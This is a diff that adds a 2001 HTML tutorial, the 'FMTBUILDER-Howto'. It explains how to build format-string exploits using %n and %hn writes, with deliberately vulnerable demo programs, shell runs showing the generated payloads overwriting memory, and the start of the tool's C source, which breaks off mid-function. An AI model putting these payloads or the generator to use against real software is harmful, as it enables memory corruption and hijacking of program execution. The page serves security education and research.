@@ -1,0 +1,662 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>Format String Builder Howto v0.1</title>
+</head>
+<body text="#000000" bgcolor="#FFFFFF" link="#0000EE" vlink="#551A8B" alink="#FF0000">
+FMTBUILDER-Howto version 0.1
+<p>----------------------------------------------------------------
+<br>&nbsp;&nbsp;&nbsp; Frederic "Pappy" Raynal &lt;<a href="mailto:frederic.raynal@inria.fr">frederic.raynal@inria.fr</a>>
+<br>&nbsp;&nbsp;&nbsp; Samuel "Zorgon" Dralet &lt;<a href="mailto:samuel.dralet@mastersecurity.fr">samuel.dralet@mastersecurity.fr</a>>
+<br>----------------------------------------------------------------
+<p>Date: 08/03/01
+<p>[ Contents ]
+<p>1.&nbsp; Introduction
+<br>2.&nbsp; Usage
+<br>3.&nbsp; Example
+<br>4.&nbsp; Notations and goals
+<br>5.&nbsp; Solution
+<br>6.&nbsp; %n way
+<br>7.&nbsp; %hn way
+<br>8.&nbsp; What if some text is placed before the format string
+<br>9.&nbsp; Alignment
+<br>10. Example: base and alignment
+<br>11. Greetings
+<br>12. References
+<br>13. Appendix
+<br>&nbsp;
+<p>----------------------------------------------------------------
+<p>-------{ 1. Introduction
+<p>This document focuses on building format strings to exploit format
+<br>bugs. The reader is supposed to know what they are and howto exploit
+<br>tham, which won't be remind here.
+<br>&nbsp;
+<p>fmtbuider is a small program that aim at building format strings. In
+<br>this document, we explain the methods and tricks used to achieve this
+<br>goal.
+<p>-------{ 2. Usage
+<p>Usage : ./fmtbuilder [-nh] -a &lt;locaddr> -v &lt;retaddr> -o &lt;offset>
+<p>&nbsp; -a &lt;locaddr> : &lt;locaddr> is the address to overwrite (
+.dtors for instance )
+<p>&nbsp; -r &lt;retaddr> : &lt;retaddr> is the address where we expect
+to return,
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+for instance because a shellcode is waiting for us ;)
+<p>&nbsp; -o &lt;offset>&nbsp; : distance (in words) to reach the beginning
+of our
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+buffer (i.e. used with the $ format - see printf(3) )
+<p>&nbsp; -b &lt;base>&nbsp;&nbsp;&nbsp; : &lt;base> is the amount of char
+placed before the our
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+own part of the format string.
+<p>Two building methods, each with its own pros and cons, are available:
+<br>&nbsp;
+<br>&nbsp; -n :&nbsp; Format string with %n
+<br>&nbsp; -h :&nbsp; Format string with %hn
+<br>&nbsp;
+<p>-------{ 3. Example
+<p>For our educational purpose, we need a very easy vulnerable program:
+<p>/* formatme1.c */
+<br>int main( int argc, char ** argv )
+<br>{
+<br>&nbsp; int bar;
+<br>&nbsp; int foo = 0x41414141;
+<br>&nbsp; char fmt[128];
+<p>&nbsp; memset( fmt, 0, sizeof(fmt) );
+<br>&nbsp; printf( "foo at 0x%x\n", &amp;foo );
+<br>&nbsp; printf( "argv[1] = [%s] (%d)\n", argv[1], strlen(argv[1]) );
+<br>&nbsp; snprintf( fmt, sizeof(fmt), argv[1] );
+<br>&nbsp; printf( "fmt=[%s] (%d)\n", fmt, strlen(fmt) );
+<br>&nbsp; printf( "foo=0x%x\n", foo );
+<br>}
+<p>Our goal is to change the value of foo to 0x0430201.
+<br>So, we just need to discover the offset to the beginning of our
+<br>buffer:
+<p>$ gcc -o formatme1 formatme1.c
+<br>$ ./formatme1 BBBB%2$\x
+<br>foo at 0xbffff8f8
+<br>argv[1] = [BBBB%2$x] (8)
+<br>fmt=[BBBB42424242] (12)
+<br>foo=0x41414141
+<p>et hop : it is 2 :)
+<br>Since our program gives the address of "foo", we just have to run it:
+<p>$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffff8f8 -b 0 -o 2 -n`
+<br>Format string builder
+<br>[ align = 0 ]
+<br>[ str = &oslash;&oslash;&yuml;&iquest;&ugrave;&oslash;&yuml;&iquest;&uacute;&oslash;&yuml;&iquest;&ucirc;&oslash;&yuml;&iquest;%241x%2$n%257x%3$n%257x%4$n%257x%5$n]
+(52)
+<br>foo at 0xbffff8d8
+<br>argv[1] = [&oslash;&oslash;&yuml;&iquest;&ugrave;&oslash;&yuml;&iquest;&uacute;&oslash;&yuml;&iquest;&ucirc;&oslash;&yuml;&iquest;%241x%2$n%257x%3$n%257x%4$n%257x%5$n]
+(52)
+<br>fmt=[&oslash;&oslash;&yuml;&iquest;&ugrave;&oslash;&yuml;&iquest;&uacute;&oslash;&yuml;&iquest;&ucirc;&oslash;&yuml;&iquest;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+] (127)
+<br>foo=0x41414141
+<p>Ok, this first run never works because the position of foo changes
+<br>when a long string is pt in the stack. But the right address is
+<br>displayed by our nice program (foo at 0xbffff8d8):
+<p>$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffff8d8 -b 0 -o 2 -n`
+<br>Format string builder
+<br>[ align = 0 ]
+<br>[ str = &Oslash;&oslash;&yuml;&iquest;&Ugrave;&oslash;&yuml;&iquest;&Uacute;&oslash;&yuml;&iquest;&Ucirc;&oslash;&yuml;&iquest;%241x%2$n%257x%3$n%257x%4$n%257x%5$n
+] (52)
+<br>foo at 0xbffff8d8
+<br>argv[1] = [&Oslash;&oslash;&yuml;&iquest;&Ugrave;&oslash;&yuml;&iquest;&Uacute;&oslash;&yuml;&iquest;&Ucirc;&oslash;&yuml;&iquest;%241x%2$n%257x%3$n%257x%4$n%257x%5$n]
+(52)
+<br>fmt=[&Oslash;&oslash;&yuml;&iquest;&Ugrave;&oslash;&yuml;&iquest;&Uacute;&oslash;&yuml;&iquest;&Ucirc;&oslash;&yuml;&iquest;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+] (127)
+<br>foo=0x4030201
+<p>And with the %hn (just the last option and the address of foo to
+<br>change):
+<p>$ ./formatme1 `./fmtbuilder -r 0x04030201 -a 0xbffff8e8 -b 0 -o 2 -h`
+<br>Format string builder
+<br>[ align = 0 ]
+<br>[ str = &egrave;&oslash;&yuml;&iquest;&ecirc;&oslash;&yuml;&iquest;%.66041x%2$n%.66050x%3$hn
+] (33)
+<br>foo at 0xbffff8e8
+<br>argv[1] = [&egrave;&oslash;&yuml;&iquest;&ecirc;&oslash;&yuml;&iquest;%.66041x%2$n%.66050x%3$hn]
+(33)
+<br>fmt=[&egrave;&oslash;&yuml;&iquest;&ecirc;&oslash;&yuml;&iquest;00000000000000000000000000000000000000000000000000000000
+<br>&nbsp;&nbsp;&nbsp;&nbsp; 000000000000000000000000000000000000000000000000000000000000000]
+(127)
+<br>foo=0x4030201
+<br>&nbsp;
+<p>-------{ 4. Notations and goals
+<br>&nbsp;
+<p>a 32-bits address is noted [b3 b2 b1 b0] where :
+<br>&nbsp; - b0 = ( addr >> 24 ) &amp; 0xff;
+<br>&nbsp; - b1 = ( addr >> 16 ) &amp; 0xff;
+<br>&nbsp; - b2 = ( addr >>&nbsp; 8 ) &amp; 0xff;
+<br>&nbsp; - b3 = ( addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ) &amp; 0xff;
+<p>Suppose we wants to write x0 to b0, x1 to b1... (where xi is an
+<br>unsigned char in { 0...255 }).
+<p>Independently from the method used to write (%n or %hn), since %n is
+<br>strictly increasing, troubles occur as soon as we don't have
+<br>x3 &lt; x2 &lt; x1 &lt; x0 which is almost always the case ;(
+<p>One needs a trick ... and (can you hear the drums rolls;) here it
+<br>comes : the solution is always to force that inequality to be true
+!
+<p>Yes, it seems incredible, isn't it ;)))
+<br>&nbsp;
+<p>-------{ 5. Solution
+<br>&nbsp;
+<p>A simple but inefficient solution would be to sort each of the xi, but
+<br>that leads to a very painful algorithm since there is 4! = 4 * 3 *
+2 * 1 = 24
+<br>available permutations (and thus as much "special cases" to handle)
+<p>We said that the xi's are in { 0...255 } ... but we are going to put
+<br>them in { 256...511 }, by simply adding 256 to each value. And so,
+one
+<br>byte is no more enough to hold the value, but that is really no matter
+<br>since we are going to use several writings:
+<p>&nbsp; for one writing, we are only interested in the last of the 2
+bytes,
+<br>&nbsp; the next writing erasing the other (garbage) byte.
+<br>&nbsp;
+<p>[ Example ]
+<p>Let's x3 = 0x44, x2 = 0x33, x1 = 0x0f and x0 = 0x01
+<p>One wants to put in memory [ 0x44 0x33 0x02 0x01 ] ... but
+<br>unfortunately, 0x44 > 0x33
+<p>Nevertheless, 0x44 &lt; 0x0133 :)&nbsp;&nbsp; &lt;- Here is the solution
+:)
+<p>Rather than writing the expected value at a given position, one has
+to
+<br>consider this value plus 0x0100. Since the value to write is in
+<br>{ 0...255 }, the written one will be in { 0...255 } + 0x0100 = { 256...511
+}
+<br>and is now coded with 2 bytes.
+<p>|---------------------------|------------------------|---------------------|
+<br>|&nbsp;&nbsp;&nbsp;&nbsp; bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; retaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|
+<br>|---------------------------|------------------------|---------------------|
+<br>| 0x44+0x0100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; = 0x0144 |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0x0144&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | 0x44 0x01&nbsp;&nbsp;
+X&nbsp;&nbsp;&nbsp; X&nbsp; |
+<br>| 0x33+0x0100-0x44 = 0x00ef | 0x0144+0x00ef = 0x0233 | 0x44 0x33 0x02&nbsp;&nbsp;
+X&nbsp; |
+<br>| 0x0f+0x0100-0x33 = 0x00dc | 0x0203+0x00dc = 0x030f | 0x44 0x33 0x0f
+0x03 |
+<br>| 0x01+0x0100-0x0f = 0x00f2 | 0x030f+0x00f2 = 0x0401 | 0x44 0x33 0x0f
+0x01 |
+<br>|---------------------------|------------------------|---------------------|
+<br>( X = undefined )
+<br>&nbsp;
+<p>As you can notice in the above table, the "garbage byte" always
+<br>increases and that is what ensures the inequality to be always true.
+<br>&nbsp;
+<p>-------{ 6. %n way
+<p>The format string is built using 4 consecutive writings %n, (almost)
+<br>as described in Kalou's article (see the references).
+<p>The only difference is the use of the previous trick, which really
+<br>makes life easier ;)
+<p>pros:
+<br>&nbsp; - sometimes, format bugs are also overflow:
+<p>&nbsp;&nbsp;&nbsp; int main( int argc, char ** argv )
+<br>&nbsp;&nbsp;&nbsp; {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char buf[64];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf( buf, argv[1] );
+<br>&nbsp;&nbsp;&nbsp; }
+<p>&nbsp;&nbsp;&nbsp; Trying to exploit this with %hn will lead to an overflow:
+the
+<br>&nbsp;&nbsp;&nbsp; string formatted by argv[1] will expand but since
+no check is
+<br>&nbsp;&nbsp;&nbsp; done, it will overflow the buffer and coredump.
+<p>cons:
+<br>&nbsp; - the string is longer than with the %hn: one needs the 4 %x,
+one
+<br>&nbsp;&nbsp;&nbsp; for each %n
+<p>&nbsp; - can overwrite something that is no more in the format string:
+as
+<br>&nbsp;&nbsp;&nbsp; shown in the example, writing with %n gets out of
+bounds. This
+<br>&nbsp;&nbsp;&nbsp; could become annoying if it changes the value of
+something
+<br>&nbsp;&nbsp;&nbsp; important:
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + a variable (or a pointer):
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+int i = 0;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+char fmt[64];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+...
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+printf(fmt);
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + the saved %ebp:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+void foo() {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+char fmt[64];
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+...
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+printf(fmt);
+<br>&nbsp;
+<p>-------{ 7. %hn way
+<br>&nbsp;
+<p>In a previous article about format bugs, I introduced another solution
+<br>to build the format string using %hn. This solves the cons of the %n
+<br>approach :
+<p>&nbsp; - the string is shorter since you just need 2 %x before the %hn
+<br>&nbsp; - you don't overwrite anything after the format string since
+you
+<br>&nbsp;&nbsp;&nbsp; write only 2 short int (2 bytes each)
+<p>Unfortunately, the %hn approach has to face the same problem as with
+<br>%n: the count is strictly increasing ... but almost the same solution
+<br>allows to solve that ;)
+<p>In the article, I used a format string looking like that :
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %[val1]x%[val2]x%[offset]hn%[offset+2]hn
+<p>Now, rather than using 2 %hn, we use firstly a %n and then a %hn. The
+<br>first %n writes to all the retaddr, even if only the last 2 bytes are
+<br>interesting (i.e. the ones we expect). Then, the %hn overwrite those
+2
+<br>"garbage" bytes with the exact value, without overflowing after the
+<br>address.
+<p>With the %n technique, the values are in { 0...255 }. Since we now use
+2
+<br>bytes, they are now in { 0...255 * 255 }. So, to be greater than the
+<br>previous written value, adding 0x0100 is no more enough, so we add
+<br>0x0100 * 0x0100 = 0x010000 instead.
+<br>&nbsp;
+<p>[ Example ]
+<p>We still consider the same values as in the previous example.
+<p>The first short we have to write is the low part : 0x4433 but
+<br>unfortunately, 0x4433 > 0x0f01
+<br>Nevertheless, 0x4433 &lt; 0x010f01.
+<p>Rather than writing the expected value at a given position, one has
+to
+<br>consider this value plus 0x010000. Since the value to write is in
+<br>{ 0...65535 }, the written one will be in { 0...65535 } + 0x010000
+=
+<br>{ 65536...131071 } and is now coded with 3 bytes (ok, 4... but the
+<br>last one will be zero)
+<br>&nbsp;
+<p>|-----------------------------|------------------------|---------------------|
+<br>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bytes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; total&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; retaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+|
+<br>|-----------------------------|------------------------|---------------------|
+<br>|0x4433+0x010000=0x014433&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+0x014433&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | 0x44 0x33
+0x01&nbsp;&nbsp; X&nbsp; |
+<br>|0x0f01+0x010000-0x4433=0xcace|0x014433+0xcace=0x020f01| 0x44 0x33
+0x0f 0x01 |
+<br>|-----------------------------|------------------------|---------------------|
+<p>The second writing is truncated because of the %hn: it cast the value
+<br>to a short int and hence keeps only the last two bytes, which are
+<br>exactly what we want.
+<br>&nbsp;
+<p>-------{ 8. What if some text is placed before the format string
+<br>&nbsp;
+<p>That's no big deal ;)
+<br>If you look in the sources (always look in the source, Luke;) you will
+<br>notice that having some character before the format string or not
+<br>makes almost no difference.
+<p>What is done to handle values xi smaller than the previous ones
+<br>(i.e. adding 0x0100 - 0x010000 - to this value) is also usable to
+<br>handle what we call the "base" (these first char) : we also add
+<br>0x0100 (or 0x010000) to the very first value to be sure that our last
+<br>char will be the one we expect.
+<p>3 situations are possible:
+<br>&nbsp; 1. base &lt;&nbsp; x3 : we just have to write x3-base in our
+format
+<br>&nbsp; 2. base == x3 : idem
+<br>&nbsp; 3. base >&nbsp; x3 : x3 has to be increased to exceed "base"
+<br>&nbsp;
+<p>But since adding 0x0100 (0x010000) doesn't change our target byte(s),
+<br>we can continue that way. So, we have to add ( base / 0x0100 ) + 1
+<br>(resp. (base / 0x010000) + 1) to x3 to be greater than "base".
+<p>[ Example ]
+<p>Take base = 0x0224 (548) (yes, I know, that will never be like that...
+it
+<br>is just to show that our algo is not so bad ;) and x3 = 0x44.
+<p>Using the %n approach, adding only 0x0100 is not enough
+<br>( 0x0100 + 0x44 = 0x0144 &lt; 0x0224 ) So, we have to add 0x0100 until
+we are
+<br>greater than 0x0224 ... which is exactly given by ( 0x0224 / 0x0100
++ 1 = 3 ).
+<p>Finally, the first writing is :
+<br>0x44 + 3 * 0x0100 - 0x0224 = 0x0120
+<p>Like that, we have written 0x120 + 0x0224 = 0x0344 char for our first
+<br>%n: as you&nbsp; can see, the last byte is the one expected :)
+<p>-------{ 9. Alignment
+<p>When dealing with buffer overflows, one has to take care about the
+<br>alignment in memory. With format bugs, this is almost never useful
+:)
+<p>The string used as format string is aligned in memory. The only thing
+<br>that could break that occurs when some char are already in the string
+<br>that is going to be exploited.
+<p>For instance, if the string contains "Alert" before being submitted
+to
+<br>our will, one will have to add 3 char just after so that the length
+is
+<br>multiple of 4, and thus aligned in memory : "AlertXXX".
+<p>We call "base" the length of those char previously in the string.
+<p>More generally, one just have to add ( 4 - base%4 ) (% means modulo)
+to
+<br>base to have a string that is well aligned.
+<p>A great care has to be taken when alignment in non-zero to discover
+<br>the offset. One can not expect anymore to retrieve his "marker" in
+a
+<br>full word. See the following example for further details.
+<p>-------{ 10. Example: base and alignment
+<p>/* formatme2.c */
+<br>int main( int argc, char **argv )
+<br>{
+<br>&nbsp; int bar;
+<br>&nbsp; int foo = 0x41414141;
+<br>&nbsp; char buffer[1024];
+<p>&nbsp; snprintf( buffer, sizeof(buffer), "%s%s", argv[1], argv[2] );
+<br>&nbsp; printf( "foo is at 0x%x\n", &amp;foo );
+<br>&nbsp; printf( buffer );
+<br>&nbsp; printf( "\nfoo=0x%x\n", foo );
+<br>}
+<p>We will use an unaligned input string "ABCDE", so we start by guessing
+<br>the offset:
+<p>$ ./formatme2 ABCDE BBBB%5\$x
+<br>foo is at 0xbffff7c8
+<br>ABCDEBBBB42424245
+<br>foo=0x41414141
+<p>$ ./formatme2 ABCDE BBBB%6\$x
+<br>foo is at 0xbffff7c8
+<br>ABCDEBBBB24362542
+<br>foo=0x41414141
+<p>We retrieve our BBBB across both offsets 5 and 6. Since we are going
+<br>to add char to align the buffer, we have to use the upper one (6):
+<p>$ ./formatme2 ABCDE `./fmtbuilder -r 0x04030201 -a 0xbffff798 -b 5 -o
+6 -n`
+<br>Format string builder
+<br>[ align = 3 ]
+<br>[ str = &divide;&yuml;&iquest;&divide;&yuml;&iquest;&divide;&yuml;&iquest;&divide;&yuml;&iquest;%233x%6$n%257x%7$n%257x%8$n%257x%9$n
+] (52)
+<br>foo is at 0xbffff798
+<br>ABCDEFGXXX&divide;&yuml;&iquest;&divide;&yuml;&iquest;&divide;&yuml;&iquest;&divide;&yuml;&iquest;
+<br>...
+<br>&nbsp;bffff798
+<br>...
+<br>&nbsp;4015e000
+<br>...
+<br>&nbsp;bffff74c
+<br>...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 44434241
+<br>foo=0x4030201
+<p>Great :)
+<p>$ ./formatme2 ABCDE `./fmtbuilder -r 0x04030201 -a 0xbffff7a8 -b 5 -o
+6 -h`
+<br>Format string builder
+<br>[ align = 3 ]
+<br>[ str = &divide;&yuml;&iquest;&ordf;&divide;&yuml;&iquest;%.66033x%6$n%.66050x%7$hn
+] (33)
+<br>foo is at 0xbffff7a8
+<br>ABCDEXXX&uml;&divide;&yuml;&iquest;&ordf;&divide;&yuml;&iquest;00000000000000000000000000000000000000000000000
+...
+<br>...
+<br>...
+<br>...
+<br>...
+<br>00000000000000000000000000000000000000000000000000000004015e000
+<br>foo=0x4030201
+<p>Still fine :) Lines full of 0 are cut.
+<br>&nbsp;
+<p>-------{ 11. Greetings
+<p>To Christophe "Korty" Bailleux for having submitted to us the
+<br>problem of automatic format string builder and all his comments.
+<p>-------{ 12. References
+<p>How to learn more about format strings ?
+<p>[1] "More info on format bugs"
+<br>&nbsp;&nbsp;&nbsp; Pascal "kalou" Bouchareine &lt;<a href="mailto:pb@grolier.fr">pb@grolier.fr</a>>
+<p>[2] "Format Bugs: What are they, Where did they come from,...
+<br>&nbsp;&nbsp;&nbsp;&nbsp; How to exploit them "
+<br>&nbsp;&nbsp;&nbsp; Lamagra &lt;<a href="mailto:lamagra@digibel.org">lamagra@digibel.org</a>>
+<p>[3] "Avoiding security holes when developing an application - 4:
+<br>&nbsp;&nbsp;&nbsp;&nbsp; Format strings"
+<br>&nbsp;&nbsp;&nbsp; Frederic "pappy" Raynal &lt;<a href="mailto:frederic.raynal@inria.fr">frederic.raynal@inria.fr</a>>
+<br>&nbsp;&nbsp;&nbsp; Christophe Grenier &lt;<a href="mailto:cgr@global-secure.fr">cgr@global-secure.fr</a>>
+<br>&nbsp;&nbsp;&nbsp; Christophe Blaess &lt;<a href="mailto:ccb@club-internet.fr">ccb@club-internet.fr</a>>
+<p>-------{ 13. Appendix
+<br>/*
+<br>&nbsp;* Copyright (C) 2001&nbsp; Frederic "Pappy" Raynal &lt;frederic.raynal@inria.fr>
+<br>&nbsp;* Copyright (C) 2001&nbsp; Samuel "Zorgon" Dralet &lt;samuel.dralet@mastersecurity.fr>
+<br>&nbsp;*
+<br>&nbsp;* This program is free software; you can redistribute it and/or
+modify
+<br>&nbsp;* it under the terms of the GNU General Public License as published
+by
+<br>&nbsp;* the Free Software Foundation; either version 2 of the License,
+or (at
+<br>&nbsp;* your option) any later version.
+<br>&nbsp;*
+<br>&nbsp;* This program is distributed in the hope that it will be useful,
+<br>&nbsp;* but WITHOUT ANY WARRANTY; without even the implied warranty
+of
+<br>&nbsp;* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU
+<br>&nbsp;* General Public License for more details.
+<br>&nbsp;*
+<br>&nbsp;* You should have received a copy of the GNU General Public License
+<br>&nbsp;* along with this program; if not, write to the Free Software
+<br>&nbsp;* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+<br>&nbsp;* USA
+<br>&nbsp;*
+<br>&nbsp;*/
+<br>&nbsp;
+<p>#include &lt;stdio.h>
+<br>#include &lt;stdlib.h>
+<br>#include &lt;unistd.h>
+<br>#include &lt;string.h>
+<p>#define ADD&nbsp;&nbsp;&nbsp;&nbsp; 0x100
+<br>#define OCT( b0, b1, b2, b3, addr ) { \
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b0 = (addr >> 24) &amp; 0xff; \
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b1 = (addr >> 16) &amp; 0xff; \
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b2 = (addr >>&nbsp; 8) &amp; 0xff; \
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+b3 = (addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ) &amp; 0xff; \
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
+<p>void
+<br>usage (char * cmd )
+<br>{
+<p>&nbsp; fprintf(stderr, "------------------------------------------------------------
+<br>----\n");
+<br>&nbsp; fprintf( stderr, "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Format string builder\n" );
+<br>&nbsp; fprintf(stderr, "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Frederic
+\"Pappy\" Raynal &lt;frederic.raynal@inria.fr>
+<br>\n");
+<br>&nbsp; fprintf(stderr, "&nbsp;&nbsp;&nbsp; Samuel \"Zorgon\" Dralet
+&lt;samuel.dralet@mastersecurity.f
+<br>r>\n");
+<br>&nbsp; fprintf(stderr, "------------------------------------------------------------
+<br>----\n");
+<p>&nbsp; fprintf( stderr, "\n" );
+<br>&nbsp; fprintf( stderr, "Usage : %s [-nh] -a &lt;locaddr> -v &lt;retaddr>
+-o &lt;offset>\n",
+<br>cmd );
+<br>&nbsp; fprintf( stderr, "&nbsp; -n :\tFormat string with %%n\n");
+<br>&nbsp; fprintf( stderr, "&nbsp; -h :\tFormat string with %%hn\n");
+<br>&nbsp; fprintf( stderr, "&nbsp; -a &lt;locaddr> : address to overwrite
+(like .dtors)\n");
+<br>&nbsp; fprintf( stderr, "&nbsp; -r &lt;retaddr> : where we want to
+return (shellcode)\n" );
+<br>&nbsp; fprintf( stderr, "&nbsp; -o &lt;offset>&nbsp; : distance in
+'words' to reach the part of
+<br>the buffer we control\n" );
+<br>&nbsp; fprintf( stderr, "&nbsp; -b &lt;base>&nbsp;&nbsp;&nbsp; : amount
+of char previously in the
+<br>string\n\n" );
+<br>&nbsp; fprintf( stderr, "E.g: %s -n -a 0x080495e8 -r 0x01020304 -o
+4 -b 0\n\n", cmd
+<br>);
+<br>&nbsp; fprintf( stderr, "[EOF]\n\n" );
+<br>}
+<p>char *
+<br>build_un( unsigned int retaddr, unsigned int offset, unsigned int base
+)
+<br>{
+<br>&nbsp; char * buf;
+<p>&nbsp; /* on calcule ou on laisse comme ca */
+<br>&nbsp; unsigned int length = 128;
+<br>&nbsp; unsigned char b0, b1, b2, b3;
+<br>&nbsp; int start = ((base / ADD) + 1)*ADD;
